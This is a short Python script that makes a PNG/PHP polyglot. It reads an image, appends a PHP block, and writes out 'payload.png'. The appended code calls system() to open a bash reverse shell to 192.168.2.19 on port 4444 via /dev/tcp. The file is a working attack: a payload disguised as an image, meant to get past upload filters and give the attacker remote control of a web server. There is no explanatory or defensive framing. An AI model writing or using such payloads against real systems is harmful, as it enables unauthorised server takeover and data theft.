#!/usr/bin/env python3
import struct

# Read PNG
with open('original.png', 'rb') as f:
    png_data = f.read()

# Create PHP polyglot
php_code = b'<?php system("/bin/bash -c \'bash -i >& /dev/tcp/192.168.2.19/4444 0>&1\'"); ?>'

# PNG header + PHP code (PHP ignores the binary data)
polyglot = png_data + php_code

with open('payload.png', 'wb') as f:
    f.write(polyglot)